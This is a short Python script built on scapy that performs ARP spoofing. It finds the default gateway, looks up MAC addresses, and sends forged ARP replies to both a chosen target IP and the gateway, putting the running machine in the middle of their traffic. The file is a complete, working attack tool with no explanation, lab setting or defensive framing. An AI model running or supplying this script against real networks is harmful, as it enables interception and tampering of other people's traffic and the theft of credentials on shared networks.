from scapy.all import ARP, Ether, ICMP, IP, sendp, sniff, sr1, srp1
import argparse

def get_mac(ip):
	arp = Ether()/ARP(pdst=ip)
	resp = srp1(arp)

	return (resp[Ether].src)


def get_default_gateway_ip():
	p = sr1(IP(dst="www.google.com", ttl = 0)/ICMP()/"XXXXXXXXXXX")

	return (p.src)


def poison_arp_cache(target_ip, target_mac_addr, spoofed_ip):
	# Create the ARP response
	spoofed_resp = Ether()/ARP()

	# Set the destination MAC address
	spoofed_resp[Ether].dst = target_mac_addr
	spoofed_resp[ARP].hwdst = target_mac_addr

	# Set the destination IP address
	spoofed_resp[ARP].pdst = target_ip

	# Set the spoofed IP address
	spoofed_resp[ARP].psrc = spoofed_ip

	# is-at (response)
	spoofed_resp[ARP].op = 2

	#print(spoofed_resp[0].show())
	sendp(spoofed_resp)


def main():
	parser = argparse.ArgumentParser()

	parser.add_argument("-t", "--target", help="Target's IP address", action="store", required=True)

	args = parser.parse_args()
	print(f"Target IP: {args.target}")

	default_gateway_ip = get_default_gateway_ip()

	# Poison target's ARP cache table
	poison_arp_cache(args.target, get_mac(args.target), default_gateway_ip)

	# Poison default gateway's ARP cache table
	poison_arp_cache(default_gateway_ip, get_mac(default_gateway_ip), args.target)


if __name__ == "__main__":
	main()